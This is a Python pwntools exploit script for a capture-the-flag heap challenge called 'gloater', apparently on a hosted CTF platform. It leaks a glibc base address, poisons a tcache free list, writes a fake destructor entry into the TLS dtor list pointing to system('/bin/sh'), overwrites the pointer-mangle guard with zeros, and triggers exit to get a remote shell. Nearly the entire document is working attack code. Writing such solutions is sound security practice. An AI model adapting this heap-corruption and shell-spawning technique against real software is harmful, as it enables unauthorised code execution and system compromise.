from pwn import *

exe = ELF("gloater_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
context.terminal = ['wezterm', 'cli', 'split-pane', '--top', '--percent', '65']
warnings.simplefilter("ignore")

remote_url = "94.237.56.46"
remote_port = 42849
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)
    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def change_user(new_user):
    menu(1)
    sa(b': ', new_user)

def create(target, taunt):
    menu(2)
    sa(b': ', target)
    sa(b': ', taunt)

def delete(idx):
    menu(3)
    sla(b': ', sn(idx))

def set_super_taunts(idx, val):
    menu(5)
    sla(b': ', sn(idx))
    sa(b': ', val)
    r.recvuntil(b': ')
    return r.recvline().strip()

name = b'test'
sa(b'> ', name)

payload = p64(0)+p64(0x71)
payload = payload.ljust(0x30, b'a')
create(b'a'*8, payload)
payload = p64(0)+p64(0xd1)
create(b'a'*8, payload.ljust(0xd0, b'a'))
create(b'b'*8, b'b'*0xd0)

# Leak libc
out = set_super_taunts(0, b'a'*0x88)
libc.address = u64(out[-6:].ljust(8, b'\x00')) - libc.sym.puts
logleak('libc.address', libc.address)

# Overwrite taunts[0] LSB
change_user(b'a'*4+b'\xe0')

# Free
delete(2)
delete(1)

# Free fake_chunk
delete(0)

# Overwrite tcache[0xe0] ptr
tls_base = libc.address+0x1f3540
tls_dtor_list = tls_base-0x58
logleak('tls_base', tls_base)
logleak('tls_dtor_list', tls_dtor_list)
payload = flat([
    0x0, 0x0,
    0x61, 0x61,
    0x0, 0x31,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0xe1,
    tls_dtor_list
])
create(b'a'*8, payload)

# Write tls_dtor_list
create(b'a'*8, b'\x00'*0xd0) # Use the first entry

# Next allocation will be placed in the `tls_area`
payload = flat([
    tls_dtor_list+0x8, # Overwrite tls_dtor_list to tls_dtor_list+8
    libc.sym.system << 17, # This is our fake dtor_list. Set dtor_list->func to system
    next(libc.search(b'/bin/sh\x00')), # Set dtor_list->obj to /bin/sh
])
# ljust(0xd0, b'\x00') eventually will overwrite
# the PTR_MANGLE with zero as well, because PTR_MANGLE 
# is located below `tls_dtor_list+0xd0`.
create(b'a'*8, payload.ljust(0xd0, b'\x00'))

# Exit and profit :)
menu(6)
r.interactive()

